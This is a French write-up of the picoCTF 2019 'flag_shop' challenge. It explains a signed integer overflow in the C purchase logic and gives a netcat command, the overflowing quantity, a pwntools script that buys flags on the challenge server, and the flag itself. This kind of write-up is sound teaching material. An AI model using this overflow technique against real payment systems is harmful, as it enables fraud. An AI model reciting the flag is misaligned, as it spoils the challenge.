# 49 — flag_shop

**Événement** : picoCTF 2019 · **Catégorie** : General Skills · **Auteur** : Danny

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé

Un service de vente de flags propose deux articles : des contrefaçons à 900 unités et le « 1337
Flag » à 100 000 unités, alors que le compte de départ contient 1 100 unités. Le code source C est
fourni et l'indice évoque le complément à deux (« Two's complement can do some weird things when
numbers get really big! »).

## Analyse

Le solde et le coût total sont des `int` signés sur 32 bits :

```c
int account_balance = 1100;
...
int total_cost = 0;
total_cost = 900*number_flags;
if(total_cost <= account_balance){
    account_balance = account_balance - total_cost;
}
```

Deux observations :

- le contrôle `total_cost <= account_balance` porte sur un entier signé : si `900*number_flags`
  dépasse `2^31-1`, la multiplication déborde et le résultat devient négatif ;
- un `total_cost` négatif satisfait la condition, et `account_balance - total_cost` augmente donc
  le solde au lieu de le diminuer.

Il suffit ensuite d'acheter le flag à 100 000 unités : le contrôle d'accès est
`if(account_balance > 100000)`, sans autre vérification.

## Solution

1. Se connecter au service et repérer les menus :

```bash
nc jupiter.challenges.picoctf.org 4906
```

2. Calculer la quantité à acheter pour déclencher le débordement. Avec 900 par contrefaçon :

```python
amount = (2**31 - 1 - 1100 + 100000) // 900
# 2386202
```

3. Acheter `2386202` contrefaçons : le coût affiché est négatif et le solde devient supérieur à
   100 000.

4. Acheter le « 1337 Flag » (option 2 puis `1`) pour obtenir le contenu de `flag.txt`.

Script pwntools équivalent :

```python
from pwn import *
io = remote("jupiter.challenges.picoctf.org", 4906)
io.sendlineafter(b" Enter a menu selection\n", b"2")
io.sendlineafter(b"2. 1337 Flag\n", b"1")
io.sendlineafter(b"enter desired quantity\n", str(2386202).encode())
io.sendlineafter(b" Enter a menu selection\n", b"2")
io.sendlineafter(b"2. 1337 Flag\n", b"2")
io.sendlineafter(b"Enter 1 to buy one", b"1")
print(io.recvlineS())
```

Attention à la variante de l'énoncé : selon la version publiée, le prix des contrefaçons est 900
(2019) ou 1000 (store, picoCTF 2018), ce qui change la quantité à fournir.

## Flag

`picoCTF{m0n3y_bag5_cd0ead78}`

## Sources

- https://yorzaren.github.io/ctf/picoctf-2019/flag-shop/ — énoncé, principe du débordement de prix et flag complet
- https://raw.githubusercontent.com/Cajac/picoCTF-Writeups/master/picoCTF_2019/General_Skills/flag_shop.md — code source C intégral, calcul de la quantité et script pwntools
